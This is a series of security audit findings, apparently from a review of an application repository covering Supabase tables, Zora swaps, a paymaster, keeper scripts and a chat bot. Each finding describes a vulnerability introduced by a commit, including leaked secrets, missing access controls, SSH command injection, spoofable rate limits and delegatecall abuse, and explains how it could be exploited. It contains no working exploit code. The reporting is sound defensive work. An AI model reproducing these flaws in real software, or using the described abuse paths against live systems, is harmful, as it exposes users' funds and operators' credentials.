description: Several schema ensure functions now delegate exclusively to new migration files. For sensitive tables, the removed inline DDL previously enabled row-level security and installed restrictive deny-all policies. The new authoritative migrations create the tables and indexes but do not enable RLS or create equivalent policies. In Supabase, public-schema tables without RLS are reachable through the public API when table privileges are available, so an attacker with the public anon key could read or tamper with wallet-intelligence cache rows and Zora CSW gate verification/challenge rows. The Zora verification code trusts rows from zora_csw_gate_telegram_tokens when consuming a token, so unauthorized table writes can undermine the intended server-side issuance path or, at minimum, allow direct tampering/DoS and leakage of CSW/Telegram-linking metadata.

title: Hermit agent now runs as root in Dockerfile.agent
description: frontend/Dockerfile.agent is based on the official Node image and does not set a USER directive, so runtime commands execute as root unless explicitly dropped with gosu. Before this commit, the Hermit branch used `exec gosu node npx tsx ...`, matching the non-Hermit branch's least-privilege behavior. The new CMD and recommended Railway Start Command invoke `./node_modules/.bin/tsx` directly. As a result, the long-lived Hermit service, which loads chat bridge/agent code and processes external data, now runs with container-root privileges. If an attacker later exploits a bug in the Hermit runtime, command surface, dependency, or message-processing path, the impact is increased: the attacker can write root-owned files, tamper with the application tree or mounted data, and access any files available to root in the container. The safe form would keep the direct local tsx binary but restore the privilege drop, e.g. `exec gosu node ./node_modules/.bin/tsx server/agents/hermit/bootstrap.ts`, after ensuring any required writable directories are owned by node.

title: Doctor command prints live secrets to stdout
description: The newly added diagnostic command is intended to be run with the same real environment variables used by Railway services. After checking presence of variables, it emits copy-paste blocks containing the actual values from process.env. This includes DATABASE_URL, ALFACLUB_CHAT_JWT, Privy access/refresh tokens, HERMIT_PINATA_BEARER_TOKEN, and ALFACLUB_TELEGRAM_BOT_TOKEN. If the command is run in Railway, CI, a shared terminal session, or its output is pasted into tickets/chat/logs, these credentials can be exposed to anyone with log or transcript access. The script even detects a Railway environment but still prints the secret-bearing blocks. Leaked database URLs can grant database access, leaked AlfaClub/Privy tokens can allow account/session impersonation, and leaked Telegram bot tokens can allow unauthorized bot control.

title: Unauthenticated Relay quote proxy can sponsor arbitrary calls
description: The commit adds a public relay/quote route. The handler performs only IP rate limiting and syntactic validation, then forwards caller-controlled target address, calldata, value, user, recipient, and optional origin/destination chain IDs to Relay with subsidizeFees enabled and the server-side Relay API key attached when configured. The comment explicitly states that arbitrary inner transactions are accepted. Because there is no authentication or binding to an owner-mutation preview/session, an attacker can use this endpoint as an open Relay proxy to obtain subsidized quotes for arbitrary transactions, including cross-chain routes by overriding originChainId/destinationChainId despite the nominal Base chainId check. This can burn the application's Relay quota/API allowance and potentially shift sponsored gas costs to the project for attacker-chosen calls.

title: Doctor script prints production secrets to stdout
description: The new railwayBlock in scripts/agent/railway-hermit-doctor.ts interpolates process.env values directly into strings and prints the full block with console.log. The script is explicitly intended to be run with the same production Railway environment values, so its output can contain DATABASE_URL with password, ALFACLUB_CHAT_JWT, Privy access/refresh tokens, and HERMIT_PINATA_BEARER_TOKEN. If the script is run in CI, Railway, shared terminals, support sessions, or logs that lower-privileged users can read, those credentials are exposed. The previous checks only reported whether secrets were present; this change prints the secret material itself. The block should redact/mask secrets by default or require an explicit unsafe flag before emitting values.

title: Ops script disables TLS verification for secret fetch
description: The newly added `send-hermit-to-1659.ts` script fetches `alfaclub_runtime_secret.secret_value` for `chat_jwt` from Supabase using `pg.Pool` with `ssl: { rejectUnauthorized: false }`. This encrypts traffic but does not authenticate the database server. If an operator runs this script on an untrusted network or through a compromised proxy/DNS route, an active man-in-the-middle can impersonate or proxy the database connection and potentially capture the AlfaClub chat JWT and database credentials or return attacker-controlled secret data. Because the script is intended for production credential use, this weakens handling of operational secrets.

title: Non-atomic daily spend cap reservation
description: The commit adds the server-core implementation of command issuer daily spend tracking. Callers first read the current daily spend in `checkCaps`, decide whether the request is allowed, and only later call `recordIssuerDailySpend` to reserve the amount. The new `recordIssuerDailySpend` implementation unconditionally inserts or increments `spent_wei` and returns the new total, but the caller never rejects if that returned total is above `dailyCapWei`. Two or more concurrent requests for the same profile can therefore read the same pre-reservation value, all pass the daily-cap check, and then all increment the ledger and submit UserOps. This bypasses the intended daily limit for delegated/command-issuer spending. The reservation should be made atomic with the cap check, for example by performing the read/check/update in a transaction with row locking, or by using a single conditional `INSERT ... ON CONFLICT DO UPDATE ... WHERE command_issuer_daily_spend.spent_wei + EXCLUDED.spent_wei <= <cap>` and refusing when no row is returned.

title: Bare /gmeow now calls Pinata by default
description: Before this change, bare /gmeow stayed on the local GIF path unless HERMIT_GMEOW_PINATA_CAPTION was set to always/legacy, while prompted /gmeow could use Pinata. The new default returns true for any unrecognized or unset mode, and executeHermitCommand then calls runPinataDraft even when args is empty. /gmeow is open to any AlfaClub room user, and the per-sender cooldown is recorded only after executeHermitCommand completes, so slow or failing Pinata requests can still tie up serverless/chat-bridge execution and consume paid Pinata/LLM quota. The risk is amplified because the existing preflight still says unset is local-only and passes unset as acceptable, so operators can deploy the new expensive behavior unintentionally. This does not affect vault funds, but it introduces an availability/cost abuse path for the chat automation surface.

title: Hermit X media upload can fetch untrusted large URLs
description: Hermit `/meme` output can include a media URL from the external creative provider, and the existing validation accepts public HTTPS image-looking URLs on broad allowed hosts such as `*.mypinata.cloud`. This commit now passes those URLs as `media` to `postTweetFromSystem`. The Twitter media path then performs `fetch(url)` and reads the entire response with `arrayBuffer()` before enforcing any size cap. A low-privileged AlfaClub room user who can influence the Hermit `/meme` response to reference an attacker-controlled allowed gateway URL can make the backend download an arbitrarily large or slow image response during automatic X cross-posting. That can tie up the serverless function or exhaust memory. Previously the Hermit X post only placed the media URL in tweet text, so this server-side fetch path was not reached from Hermit cross-posts.

title: Hardcoded paid RPC auth token in ops script
description: A newly added script embeds a paid RPC endpoint with an `auth=` credential directly in source code. Anyone with access to the repository can extract and use this token to consume the paid RPC service, potentially exhausting quota, incurring cost, or disrupting operational scripts that rely on the same credential. Secrets and authenticated RPC URLs should be supplied through environment variables or a secret manager, and the exposed token should be rotated.

title: Cron smoke can leak CRON_SECRET to arbitrary origins
description: The added operator script reads a real production CRON_SECRET and sends it as the x-cron-secret header to every probed endpoint. The destination origin is taken directly from --origin or ALFACLUB_SMOKE_ORIGIN and is concatenated into the request URL without any allowlist, hostname check, or HTTPS enforcement. If an attacker can influence an operator's command line/environment, or convince them to run the smoke test against a malicious origin, the attacker-controlled server receives the CRON_SECRET. That secret gates production AlfaClub cron endpoints, including auth-health, forced token refresh, bridge execution, and daily brief execution. This is not a remotely exploitable deployed-app bug by itself, but it creates an operational secret-exfiltration footgun in an incident-recovery script that explicitly requires production credentials.

title: Unauthenticated /alfa status leaks bridge auth health
description: The new `/alfa status` implementation now calls `formatAlfaClubStatusForChat()`, which reads the live chat JWT row metadata and the auth health snapshot, then formats bridge auth information for chat. This includes JWT expiry timing, the token row writer, last refresh success/failure timestamps, failure codes, Cloudflare challenge counters, auth failure counters, and socket backoff. The existing HTTP endpoint for this same auth-health data is explicitly CRON_SECRET-gated, but the chat command path does not enforce an equivalent ops/admin gate. The `/alfa` command family is dispatched from `executeCommand` without passing chat context or checking whether the caller is in an ops room, and the Telegram group-admin gate does not include the `alfaclub` family. As a result, any user who can invoke the bot’s `/alfa status` command can obtain operational auth-health metadata that was previously only available behind the cron secret. No raw JWT is printed, but the disclosed status can help an attacker fingerprint outages, credential expiry windows, anomalous token writers/admin wallet addresses, and bridge protection/backoff state.

title: Daily brief sync disables AlfaClub room gates
description: The new roomPolicySync path is meant to populate creator room link mappings, but it reuses alfaclub.room_access_policies, which is also the access-control table for token-gated AlfaClub rooms. The sync is enabled by default and is invoked from runAlfaClubDailyBrief before each non-duplicate dispatch. For every candidate, it calls upsertAlfaClubRoomAccessPolicy with enabled: false. That upsert uses ON CONFLICT(room_id) DO UPDATE and assigns enabled = EXCLUDED.enabled, so an already-enabled, admin-configured access policy is overwritten as disabled. Once disabled, joinAlfaClubRoomAccess rejects joins as not enabled, and recheckAlfaClubRoomAccessMemberships exits without evaluating/removing stale members. This converts a read/link-resolution cron into a recurring access-control mutation that can break gated room availability and allow previously active but no-longer-eligible members to avoid enforcement.

title: AlfaClub read flag bypass exposes leaderboard data
description: Before this change, the default leaderboard path used `loadLeaderboard(flags)`, which returns no rows when `flags.readEnabled` is false. The new `/alfa brief` branch and replacement default leaderboard branch call `buildAlfaClubBriefContext()` directly. That helper reads the latest snapshot, all creators, recent publications, labels, and room links using daily-brief flags only, and never enforces the Vigilante `readEnabled` gate. As a result, operators who disable AlfaClub reads with `ALFACLUB_VIGILANTE_READ_ENABLED=0` still expose the latest leaderboard/digest data through chat commands. This is an authorization/policy bypass and potential analytics/data disclosure issue.

title: Daily brief leaks room links from chat activity
description: Before this change, daily brief and radar links came from the room access policy table. The new resolveCreatorRoomLinks fallback queries alfaclub.chat_ingest for any room where the creator wallet has sent messages, selects the most active room, and then daily brief/radar publish that room URL. chat_ingest is populated from live/history chat across rooms visible to the bridge identity, not from an explicit public/canonical room mapping. As a result, if a creator has chatted in a private, disabled, test, or unrelated room with no policy row, the scheduled brief/radar can disclose and advertise that room ID/URL to the configured daily brief or Telegram audience. A malicious creator can also influence the official link for their leaderboard entry by posting more messages in a chosen room. This is not a direct room-membership bypass, but it leaks room identifiers and weakens integrity of official room links because the fallback does not require an enabled room_access_policies row or any proof that the room is intended to be public/canonical for that creator.

title: Unauthenticated requests can exhaust keeper job rate limits
description: The renamed rate-limit bucket is now valid on keeper job and keepr action mutation endpoints. Unlike the vault trigger endpoints, these handlers call checkRateLimit before requireKeeprApiKey. Because the key is only the endpoint name plus getClientIp(req), unauthenticated POSTs count against the same per-IP quota used by legitimate keeper workers. An attacker who can send requests from the same observed client IP, or in deployments where forwarded IP headers collapse/spoof to a shared value, can exhaust keeperDecisionsWrite and temporarily block job claiming, completion, enqueueing, action execution, and action status updates. This can delay or halt keeper automation without knowing KPR_API_KEY. The fix is to authenticate first, or include an authenticated principal/API-key identity in the rate-limit key while still separately applying cheap unauthenticated abuse throttles.

title: CSW Zora swaps silently force 5% slippage
description: For Zora permit-finalized swaps, the caller passes the user's parsed slippage into prepareZoraQuoteForExecute. The UI default is 0.5% and the parsed value is capped at 5%. This commit changes executeZoraCswQuoteWithEscalation so any deployed smart-wallet execution uses Math.max(startSlippage, 5) before building the slippage ladder. As a result, a user who selected 0.5%, 1%, or 2% has the initial executable Zora refresh built with 5% slippage. The status message only announces escalation when i > 0, so this first forced 5% quote can happen silently. Because Permit2 signatures authorize token spend but do not protect the router min-out chosen by the refreshed quote, the generated calldata can allow materially worse execution than the user intended, making CSW Zora swaps more exposed to sandwiching or stale/liquidity-driven price movement.

title: Zora swaps can exceed user slippage limits
description: The new Zora retry path builds an escalation ladder from the user's slippage setting and then retries quotes at higher slippage values when simulation fails. The normal swap state clamps user-configured slippage to at most 5%, and the client policy check evaluates only that parsed user value. However, executeZoraCswQuoteWithEscalation can later request refreshed Zora quotes using larger values such as 10% or 15%, sign permits, build the swap transaction, and proceed with submission. This undermines the user's explicit slippage tolerance and any VITE_UNISWAP_MAX_SLIPPAGE_BPS-style policy based on parsedSlippage. A user initiating a Zora swap on a thin pool could therefore execute with substantially worse minimum output than they selected, increasing exposure to sandwiching or adverse price movement.

title: Permit2 match lets arbitrary Zora swaps get sponsorship
description: In the Zora no-approval sponsorship path, the commit adds `permit2` to the list of candidate input tokens and resolves candidates by searching for a bare 20-byte address anywhere in raw router calldata. Permit2 is infrastructure, not the token being sold. If a Zora Universal Router payload contains the Permit2 address but omits USDC/ZORA/WETH as a bare token address, `swapInputToken` becomes the Permit2 contract. The later validation only re-checks that the same Permit2 address appears in the raw calldata, then marks the call as `mode: 'swap'` and returns before the stricter pass-2 target/selector validation. This widens the paymaster policy so an authenticated/allowlisted attacker can get gas sponsorship for Zora router operations that are not actually constrained to the intended input tokens, potentially draining paymaster budget through unauthorized sponsored router calls.

title: Paymaster accepts unvalidated Universal Router calldata
description: The paymaster now treats selector 0x24856bc3, the Universal Router execute(bytes,bytes[]) overload, as a Zora swap on any allowed Universal Router. Unlike the existing execute(bytes,bytes[],uint256) path, this new path does not canonicalize/decode calldata and does not enforce the Universal Router command opcode allowlist. For embedded-permit Zora swaps with no approval call, it infers the input token by checking whether the raw calldata contains USDC or the configured Zora token. Because this is only a substring check over the full calldata, a caller can include the token address in unused/trailing ABI data or in an unrelated command input and still pass paymaster validation. The same weak raw check is then used for zora-universal router calls generally. This expands paymaster sponsorship from constrained swap commands to arbitrary execute(bytes,bytes[]) Universal Router command streams, allowing allowlisted users to spend sponsored gas on non-canonical or non-swap router operations and potentially exhaust paymaster budget within the existing rate limits.

title: Nested Uniswap quote bypasses swap policy checks
description: The commit introduced swap quote sanitization that unwraps fields such as `quote.quote`, `quote.classicQuote`, `quote.wrapUnwrapQuote`, or `quote.bridgeQuote` before forwarding the request upstream. However, `/api/uniswap/swap` still runs `validateQuoteTokenPolicy` and `validateRoutePolicy` against the original outer `body.quote` before this unwrapping. An authenticated caller can submit an outer quote with allowlisted tokens and an allowed routing value, while placing denylisted/unallowlisted tokens or a disallowed route inside `quote.quote`. The API accepts the request, sanitization replaces the forwarded quote with the nested object, and the Uniswap API receives the policy-bypassing nested quote. This bypasses the server-side token allowlist/denylist and route restrictions when those controls are configured.

title: Unescaped mint argument enables Vultr SSH command injection
description: The newly added `ops:update-vultr-mapping` command accepts a `--mint` CLI argument intended to be a Solana public key, but it only checks that the `--share-oft` argument is an EVM address. The raw `mint` string is embedded inside a Bash script sent to `ssh ... bash -s` and also inside an inline Python string. A malicious mint containing quotes and shell metacharacters could break out of `MINT="..."` and execute arbitrary commands on the Vultr orchestrator host under the SSH account used by the operator. Because this helper is meant to restart the Solana keeper orchestrator and edit `/etc/4626/solana-keeper-orchestrator.env`, the SSH account is likely privileged. The complete AKITA wrapper path currently passes a hardcoded safe mint, but the package exposes the helper as a standalone ops command and the helper itself is unsafe for any attacker-controlled or copy-pasted mint value. The fix should validate `--mint` as a real Solana public key/base58 value and avoid string interpolation into shell code; pass structured data via stdin/environment with robust quoting such as JSON/base64, or use `JSON.stringify` for Python literals and avoid shell assignments from raw input.

title: Unknown XMTP groups bypass chat consent filtering
description: The new group discovery helper includes ConsentState.Unknown in every syncAll call and provider.refreshConversations now uses that helper before listing and merging all groups into the normal conversation list. Because the resulting conversations are rendered like ordinary chats, an external XMTP group admin who can add the user's inbox to a group can cause unsolicited Unknown-consent group metadata and messages to appear in the app without an explicit user accept flow. The new allowConversationIfUnknown/finalizeResolvedConversation path also changes any resolved Unknown conversation to Allowed without requiring caller proof that the conversation is the server-verified waitlist group or that the user explicitly approved it. The Unknown sync/allow behavior should be scoped only to the specific authenticated waitlist group membership, and Unknown groups should not be merged into the general chat list or consent-upgraded by a generic resolver.

title: Devnet deploy script writes private key to repo file
description: When SOLANA_PRIVATE_KEY is provided, the script creates a temporary keypair path and invokes `node - "$tmp"`. In Node, `process.argv[1]` is the literal `-` used for stdin script execution, while the temp path is `process.argv[2]`. The script then uses `process.argv[1]` as the output path, so `fs.writeFileSync` writes the decoded Solana private key to a file named `-` in the `pnpm -C "$REPO_ROOT/kpr"` working directory. That file is not removed by the cleanup trap, and Node's default file mode is typically world-readable subject to umask. This can expose the payer private key to other local users/processes or to tooling that packages or backs up the repository. The intended temp file remains empty, so deployment may also fail after leaking the key.

title: Cost probe copies operator keypair to predictable /tmp file
description: The newly added kpr/scripts/solana/cost-probe-devnet.ts script supports loading a payer keypair from an environment variable, JSON array, base58 secret, or path. After loading it, the script always serializes payer.secretKey to the fixed path /tmp/4626-devnet-cost-probe.json with writeFileSync and no restrictive mode or safe temporary-file handling. On typical systems this creates files subject to the process umask, often 0644, and the predictable /tmp path also makes local pre-creation/symlink attacks easier. If an operator follows the script's guidance to use a funded wallet, a local user or CI artifact collector could obtain the Solana private key and drain that wallet or misuse any authorities it controls. This does not appear to affect on-chain protocol logic directly, but it is an operational secret exposure introduced by this commit.

title: Phase2 module hot-swap permits arbitrary delegatecall logic
description: The commit adds setPhase2Module(), which updates the delegatecall target used by Phase 2 deployment/finalization. The only validation is that the candidate contract's batcher() getter returns address(this). That is not sufficient to prove the target is the expected DeploymentBatcherPhase2Module bytecode, has matching immutable constructor parameters, or is non-upgradeable. Any contract/proxy can implement batcher() correctly while providing malicious deployPhase2Core/finalizePhase2Execution logic. Because _delegatePhase2 uses delegatecall, that logic executes in DeploymentBatcher storage/context. In finalizePhase2/finalizePhase2WithPermit2, creator tokens are pulled into the batcher before the delegatecall, so a malicious module can steal or misroute those tokens/shares and can corrupt batcher storage. Exploitation requires the protocolTreasury authority or approval of a malicious/compromised treasury Safe transaction, so this is not a public unauthenticated exploit, but it materially expands a configuration role into arbitrary code execution over the batcher.

title: Safe ops script can leak signer private key as tx hash
description: The added frontend/scripts/ops/execute-pending-safe-txs.ts script derives safeTxHash values by filtering all process.argv entries for strings that start with 0x and are length 66. Ethereum private keys are also 0x plus 64 hex characters. Because the same script accepts --safe-owner-pk as a command-line option, an operator who follows that interface will have their private key added to hashArgs. The loop then calls apiKit.getTransaction(safeTxHash) for every collected value, causing the private key to be embedded in an outbound Safe API request path/query and potentially recorded by the Safe service, proxies, local logs, or monitoring. Leakage of a Safe owner private key can allow unauthorized signing and potentially treasury/admin transaction execution depending on Safe threshold and co-signer controls.

title: Keeper registry fallback accepts spoofed grandfathered vaults
description: The new verifyGrandfatheredVaultBinding path does not prove that the listed vault is an approved grandfathered vault or a genuine CreatorOVault implementation. It only checks that the vault address has bytecode and that calling asset() returns the claimed creator coin. A malicious contract can trivially implement asset() and the vault keeper read methods to pass this check. The fallback is enabled by default and is invoked not only for inactive creator coins, but also when the registry vault or share-token binding mismatches. Once accepted, the keeper workflows treat the returned API listing as verified and can sign tend/report or other configured workflow transactions against addresses from that listing. This weakens the previous client-side defense that required exact on-chain registry bindings for API-provided vault addresses.

title: Keeper env sync writes production secrets world-readable
description: scripts/ops/sync-kpr-env-from-vercel.sh copies kpr/secrets.example.env to kpr/.env when the file does not exist, then merges production secrets such as KPR_API_KEY and SOLANA_ORCHESTRATOR_API_KEY into that file. The example file is mode 0644 in the repository, and the script does not set umask 077, use install -m 600, or chmod the destination before or after writing. On systems with the common umask 022, this creates kpr/.env as world-readable, exposing production keeper credentials to other local users or untrusted CI/build steps sharing the workspace. Compromise of these keys could allow unauthorized access to protected keeper/orchestrator operations.

title: Vault keeper dry-run can execute live writes
description: Before this commit, vault-keeper writes went through writeContract(), which checks DRY_RUN and simulates instead of broadcasting. The commit introduced invokeKeeperWrite(), which prefers the HTTP bridge whenever KPR_API_BASE_URL and KPR_API_KEY are set. That bridge unconditionally POSTs to /api/keeper/tend or /api/keeper/report and the Vercel endpoint signs with KPR_PRIVATE_KEY. Because invokeKeeperWrite() does not check DRY_RUN before using the bridge, running `pnpm exec tsx runner.ts vault-keeper --dry-run` with normal production keeper API settings can produce real on-chain tend/report transactions. This is especially risky because the new runbook and smoke-test script explicitly instruct operators to run vault-keeper in dry-run mode after configuring KPR_API_BASE_URL/KPR_API_KEY. A safe fix is to either disable the HTTP bridge when DRY_RUN=true, route dry-run bridge calls to a simulation-only endpoint, or pass a dry-run flag that the server enforces before signing.

title: Unbounded Ethos dedupe query enables API DoS
description: The new projection query wraps creator_ethos_projection in identity_ranked and computes ROW_NUMBER() PARTITION BY a computed identity key using trim/lower/regexp_replace for every matching row. The final OFFSET/LIMIT is applied only after the window function and identity_rank filter, so a request for count=1 can still require processing the full projection table when ethosMin is absent or broad. Existing indexes on ethos_score and volume_24h_usd do not directly support the computed partition key, making this materially more expensive than the prior indexed ORDER BY/OFFSET/LIMIT projection query. The /api/zora/explore handler is reachable via unauthenticated GET requests and does not apply checkRateLimit; attackers can vary after and ethosMin query parameters to avoid shared-cache hits while repeatedly triggering the expensive query.

title: Unbounded Relay fee seed can overcharge owner mutations
description: When the initial zero-amount Relay quote lacks native payment details, the new code derives the retry quote amount from `fees.gas.amount * 127` or from live gas price. Both inputs are external, and the derived value has only a minimum floor, not a maximum cap or sanity check. The retry amount is then sent to Relay and later used to construct the native `depositNative` user call value. A malicious or faulty Relay response, or a compromised/misbehaving RPC gas-price source when `fees.gas` is absent, can cause the backend to return an excessive native ETH deposit call for an owner mutation. The validation logic checks only that the value is above a minimum and matches Relay payment details/shape; it does not reject unreasonable overpayment. This can cause users who trust the app flow to sign a transaction depositing far more ETH than intended into Relay's depository.

title: Public explore API amplifies Zora API calls
description: In assembleEthosSortedCreatorResponse, the previous filtering logic was removed and the handler now invokes sdk.getCoin for every pageRows entry whenever a Zora server key is configured. The public GET /api/zora/explore path accepts ETHOS_SCORE creator-list requests without authentication or a handler-level rate limit and allows count up to 50. Attackers can repeatedly request uncached variations such as different after/ethosMin values to trigger 50 parallel upstream getCoin calls per request. This can exhaust the ZORA_SERVER_API_KEY quota, create serverless latency/resource pressure, and reduce availability for Zora-backed explore functionality. The old code skipped getCoin entirely for projection rows and for DB rows that already had sufficient identity/metric data, so this is a commit-introduced amplification.

title: Spoofable rate limit on tray portfolio proxy
description: The newly introduced wallet tray portfolio API is unauthenticated and proxies requests to paid/limited third-party providers. Its rate limiter keys buckets using the first value of the request's x-forwarded-for header before falling back to x-real-ip. Because x-forwarded-for can be supplied or manipulated by direct clients unless the platform overwrites it, an attacker can send each request with a different spoofed value and avoid the 30 requests/minute bucket. Each accepted request can request up to 5 wallets and triggers DeBank and, on fallback, Etherscan/DefiLlama calls, so bypassing the limiter can exhaust provider quotas or cause account tray portfolio lookups to fail for legitimate users. The repository already has a trusted client IP helper for DeBank-style endpoints, but this new route implements its own spoofable keying logic instead.

title: Unvalidated Relay paymentDetails now override quote transaction
description: The new selectOwnerMutationRelayUserCall helper returns builtUserCallFromPaymentDetails before falling back to the quote transaction. However, builtUserCallFromPaymentDetails is built directly from e.paymentDetails.depository and e.paymentDetails.amount after only checking that the currency is native and the amount is a positive decimal string. This means a tampered or compromised Relay quote response can include an otherwise valid router quote transaction but also include inflated paymentDetails.amount or a different depository address, causing the API response to instruct clients to submit a higher-value depositNative transaction derived from those untrusted fields. The official frontend has a later guard that rejects non-canonical depository targets, which mitigates arbitrary-target deposits in that path, but it still trusts the server-provided value and the server API itself now emits the overridden call. The regression is introduced by changing the selection priority: previously a valid RelayRouter multicall quote transaction was used first; after this commit, any built paymentDetails call wins.

title: Spoofable rate limit on expensive DeBank portfolio proxy
description: The introduced wallet portfolio batch handler implements its own per-IP rate limiter instead of using the existing trusted IP and durable rate-limit helpers used by `debank/tokenList`. `getClientKey()` reads `x-forwarded-for` first, which is client-controllable in typical Vercel deployments, so a caller can send a different header value on each request and receive a fresh bucket. The buckets are also stored in `globalThis`, so they are not shared across serverless instances or cold starts. This matters because each allowed request accepts up to 5 wallet addresses, and each wallet portfolio fetch performs multiple DeBank Pro API calls (`total_balance`, `used_chain_list`, `complex_protocol_list`, and `all_token_list`) using the server-side `DEBANK_ACCESS_KEY`. An unauthenticated attacker can therefore amplify requests into many paid/limited upstream calls and potentially exhaust API quota or cause availability degradation for legitimate portfolio features.

title: XMTP DB key persisted in localStorage
description: The new XMTP local storage helper persists the 32-byte `dbEncryptionKey` under a predictable localStorage key. `getOrCreateEncKeyHex` now reads/writes this value through that helper so the key survives reloads. localStorage is not appropriate storage for encryption material: any XSS, compromised same-origin script, malicious injected dependency, or browser extension with site access can read it and potentially use it with the OPFS XMTP database to recover local messaging state/history. The prior implementation kept these keys in an in-memory Map for the page session only, limiting exposure after refresh.

title: Public leaderboard discloses linked social identity
description: The waitlist leaderboard endpoint remains publicly accessible: it resolves an authorized principal only to populate the optional `me` row, but does not require authentication before returning leaderboard rows. This commit expands each public row with `labelHint`, `avatarUrl`, and social-badge metadata sourced from `account_zora_signals`, `zora_profiles`, `profiles.preprov_zora_handle`, `profiles.avatar_url`, and `profiles.preprov_farcaster_pfp`. The frontend then displays the label and directly loads the avatar URL in an ``. As a result, any unauthenticated caller can enumerate up to the public leaderboard window and learn linked Zora/basename/Farcaster-style identity hints and avatar URLs associated with waitlist signup IDs, ranks, points, and CSW addresses. Direct avatar loading can also disclose visitors' browser/IP information to third-party avatar hosts.
